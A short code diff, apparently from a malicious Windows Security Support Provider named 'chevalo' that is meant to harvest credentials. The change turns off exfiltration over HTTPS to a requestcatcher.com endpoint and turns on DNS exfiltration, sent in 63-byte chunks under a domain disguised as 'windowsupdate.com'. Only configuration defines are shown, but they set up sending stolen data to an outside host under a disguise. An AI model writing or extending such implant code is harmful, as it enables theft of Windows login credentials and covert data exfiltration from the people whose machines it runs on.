@@ -6,13 +6,19 @@
 #include <NTSecAPI.h>
 #include <ntsecpkg.h>
 #include <stdio.h>
+#include "utils.h"
 
-#define HTTPS_EXFILTRATION 1
+#define HTTPS_EXFILTRATION 0
 #define HTTPS_ENDPOINT L"chevalo.requestcatcher.com"
 #define USERAGENT L"WinHTTP Example/1.0"
 
 #define SSP_NAME L"chevalo"
 #define SSP_COMMENT L"chevalo trust me i'm safe"
 
+#define DNS_EXFILTRATION 1
+#define TLD "windowsupdate.com"
+#define IP "192.168.0.21"
 
+
+#define SIZE_CHUNK 63
 #define BUFFER_SIZE 512
